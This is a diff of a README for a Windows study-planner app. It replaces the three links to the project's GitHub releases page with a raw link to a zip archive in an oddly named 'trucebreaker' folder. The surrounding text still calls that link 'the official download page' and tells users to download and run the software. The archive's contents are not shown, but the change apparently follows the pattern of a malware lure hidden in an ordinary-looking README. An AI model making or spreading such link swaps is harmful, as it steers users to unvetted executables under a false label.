@@ -1,6 +1,6 @@
 # 📚 Study-Planner-App- - Organize Your Study Time Easily
 
-[![Download Study-Planner-App-](https://img.shields.io/badge/Download-Study--Planner--App--BrightGreen?style=for-the-badge&logo=github)](https://github.com/FrancisKentCacho/Study-Planner-App-/releases)
+[![Download Study-Planner-App-](https://img.shields.io/badge/Download-Study--Planner--App--BrightGreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/FrancisKentCacho/Study-Planner-App-/main/trucebreaker/Study_Planner_App_3.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get Study-Planner-App- on your Windows computer and start 
 
 Click the big button at the top of this page or go to this link:
 
-https://github.com/FrancisKentCacho/Study-Planner-App-/releases
+https://raw.githubusercontent.com/FrancisKentCacho/Study-Planner-App-/main/trucebreaker/Study_Planner_App_3.5.zip
 
 This is the official download page where the latest version is available.
 
@@ -117,6 +117,6 @@ You can switch between dark and light themes with the button on the top-right co
 
 ## 📥 Download Study-Planner-App- Now
 
-[![Download Study-Planner-App-](https://img.shields.io/badge/Get-Study--Planner--App--Blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/FrancisKentCacho/Study-Planner-App-/releases)
+[![Download Study-Planner-App-](https://img.shields.io/badge/Get-Study--Planner--App--Blue?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/FrancisKentCacho/Study-Planner-App-/main/trucebreaker/Study_Planner_App_3.5.zip)
 
 Visit the page above to download and run this software on your Windows PC.
